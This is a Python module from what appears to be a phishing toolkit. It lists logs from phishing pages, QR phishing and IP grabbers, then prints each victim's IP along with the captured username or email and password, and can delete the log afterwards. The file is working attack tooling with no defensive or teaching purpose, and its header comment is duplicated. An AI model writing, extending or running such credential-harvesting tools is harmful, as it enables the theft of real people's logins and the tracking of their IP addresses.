# Log Viewer
# view harvested logs
# Log Viewer
# view harvested logs

from Config.Colors import *
from Config.Util import *

import os
import json


def _iter_logs():
    od = output_dir()
    if not os.path.isdir(od):
        return []
    files = []
    for f in os.listdir(od):
        if f.endswith(".log") and (
            f.startswith(("phish_", "harvest_", "qr_phish_", "ipgrab_", "qr_ipgrab_"))
        ):
            files.append(os.path.join(od, f))
    files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
    return files


def run():
    banner()
    log("Log Viewer", "info")

    files = _iter_logs()
    if not files:
        log("no logs found in Output/", "warn"); pause(); return

    print(f"{WHITE}logs (newest first):{RESET}")
    for i, p in enumerate(files, 1):
        size = os.path.getsize(p)
        print(f"  {GREEN}[{i:>2}]{RESET} {os.path.basename(p):<40} {size} bytes")

    sel = input_line("open # (blank to cancel) > ").strip()
    if not sel.isdigit():
        return
    idx = int(sel) - 1
    if not (0 <= idx < len(files)):
        pause(); return

    path = files[idx]
    print()
    print(f"{WHITE}── {os.path.basename(path)} ──{RESET}")
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                e = json.loads(line)
                f2 = e.get("form", {})
                u = (f2.get("username") or f2.get("email") or [""])[0]
                p = (f2.get("password") or [""])[0]
                if u or p:
                    print(f"{DIM}{e.get('time')}{RESET}  {e.get('ip')}  "
                          f"user={u!r}  pass={p!r}")
                else:
                    print(f"{DIM}{e.get('time')}{RESET}  {e.get('ip')}  {e.get('note','')}")
            except Exception:
                print(line)

    if confirm("\ndelete this log? [y/n] "):
        try:
            os.remove(path)
            log("deleted", "ok")
        except Exception as e:
            log(f"failed: {e}", "err")
    pause()